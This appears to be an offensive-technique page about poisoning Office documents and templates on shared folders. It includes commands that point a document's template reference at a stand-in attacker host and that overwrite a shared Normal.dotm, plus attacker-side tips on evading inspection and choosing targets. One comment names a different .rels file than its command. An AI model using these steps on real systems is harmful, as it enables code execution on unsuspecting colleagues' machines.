---
title: "Office and template poisoning: run code when a shared document opens"
description: "Planting or modifying Office files on a writable share so the next user who opens them runs attacker code: macro-enabled documents, remote-template injection that fetches a macro at open time, and poisoning a shared normal.dotm template or add-in used across the team."
keywords:
  - macro
  - remote template injection
  - normal.dotm
  - Office add-in
  - document poisoning
---

# Office and template poisoning

Shared folders hold the documents a team opens every day, which makes them a delivery channel. An attacker with write access plants a macro-enabled file, injects a remote template reference into an existing document so it fetches a macro at open time, or poisons a shared template (`normal.dotm`) or add-in that Office loads automatically for everyone who uses it.

```bash
# Inject a remote template reference into an existing .docx on the share
# (document.xml.rels Target points at the attacker's macro template)
unzip doc.docx word/_rels/settings.xml.rels   # edit Target=http(s)://attacker/t.dotm
# Or replace a shared template that Office autoloads
cp evil.dotm '//share/Templates/Normal.dotm'
```

## Exploitation notes

- Remote-template injection keeps the document looking normal and fetches the payload only at open, which evades static inspection of the file on the share.
- A poisoned shared `normal.dotm` or startup add-in runs for every user who opens Office against that path, a broad foothold.
- Macro execution depends on the victim's Office macro policy; target teams where macros are enabled for shared templates.

## References

- [HackTricks: phishing documents](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/phishing-documents.html)
- [Microsoft: Office template and add-in startup](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/startup-folders)
